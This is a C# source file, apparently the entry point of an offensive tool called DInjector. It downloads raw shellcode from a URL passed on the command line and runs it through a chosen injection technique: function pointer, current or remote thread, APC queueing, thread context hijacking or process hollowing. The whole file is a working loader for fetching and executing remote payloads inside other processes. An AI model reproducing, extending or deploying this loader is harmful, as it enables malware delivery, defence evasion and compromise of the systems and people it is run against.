using System;
using System.IO;
using System.Net;
using System.Collections.Generic;

namespace DInjector
{
    public class Program
    {
        public static void Main(string[] args)
        {
            var options = ArgumentParser.Parse(args);

            var commandName = string.Empty;
            foreach (KeyValuePair<string, string> item in options)
            {
                if (item.Value == string.Empty)
                {
                    commandName = item.Key;
                }
            }

            WebClient wc = new WebClient();
            ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
            MemoryStream ms = new MemoryStream(wc.DownloadData(options["/sc"]));
            BinaryReader br = new BinaryReader(ms);
            byte[] shellcodeBytes = br.ReadBytes(Convert.ToInt32(ms.Length));

            switch (commandName)
            {
                case "functionpointer":
                    FunctionPointer.Execute(shellcodeBytes);
                    break;
                case "functionpointerv2":
                    FunctionPointerV2.Execute(shellcodeBytes);
                    break;
                case "currentthread":
                    CurrentThread.Execute(shellcodeBytes);
                    break;
                case "remotethread":
                    var processID = int.Parse(options["/pid"]);
                    RemoteThread.Execute(shellcodeBytes, processID);
                    break;
                case "remotethreadapc":
                    var processImageAPC = options["/image"];
                    RemoteThreadAPC.Execute(shellcodeBytes, processImageAPC);
                    break;
                case "remotethreadcontext":
                    var processImageContext = options["/image"];
                    RemoteThreadContext.Execute(shellcodeBytes, processImageContext);
                    break;
                case "processhollow":
                    var processImageHollow = options["/image"];
                    ProcessHollow.Execute(shellcodeBytes, processImageHollow);
                    break;
            }
        }
    }
}
